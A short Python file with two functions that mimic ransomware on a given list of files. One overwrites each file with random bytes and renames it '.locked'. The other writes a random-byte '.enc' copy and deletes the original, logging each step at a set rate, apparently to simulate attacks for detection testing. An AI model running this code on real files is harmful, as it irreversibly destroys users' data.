import os, time, random

def inplace_fast(files, rate, log_func):
    for p in files:
        try:
            with open(p, "r+b") as f:
                n = os.path.getsize(p)
                f.write(os.urandom(n))
            new_path = p + ".locked"
            os.rename(p, new_path)
            log_func("modified", p)
            log_func("moved", p, new_path)
            time.sleep(1.0 / rate)
        except OSError:
            pass

def copy_delete(files, rate, log_func):
    for p in files:
        try:
            new_path = p + ".enc"
            with open(new_path, "wb") as f:
                f.write(os.urandom(os.path.getsize(p)))
            os.remove(p)
            log_func("created", new_path)
            log_func("deleted", p)
            time.sleep(1.0 / rate)
        except OSError:
            pass
